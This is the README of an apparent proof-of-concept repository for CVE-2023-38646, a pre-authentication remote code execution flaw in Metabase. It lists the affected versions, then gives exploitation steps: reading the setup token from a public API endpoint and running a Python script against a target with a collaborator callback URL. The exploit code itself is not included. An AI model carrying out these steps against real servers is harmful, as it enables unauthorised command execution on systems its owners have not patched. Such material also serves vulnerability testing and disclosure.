# CVE-2023-38646 - Metabase Pre-auth RCE

![Untitled presentation](https://github.com/shamo0/CVE-2023-38646-PoC/assets/48299520/13d20129-bef1-48d7-8b4b-0d25713df35e)

Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation. The other fixed versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.


## PoC Steps

1. Navigate to `http://vulnerablehost.com/api/session/properties`
2. Identify "setup-token"
![ddddd](https://github.com/shamo0/CVE-2023-38646-PoC/assets/48299520/9f377e05-59b1-448d-84c7-16064b2786c1)

3. Get a collaborator url (Tested with BurpSuite)
4. Run the PoC Script with:
- -u  - Target URL
- -t  - Setup token
- -c  - Collaborator url
- `python3 CVE-2023-38646.py -u <target> -t <setup-token> -c <collaborator-url>`
5. Check your collaborator for any callbacks


## References
- https://www.metabase.com/blog/security-advisory
- https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
- https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
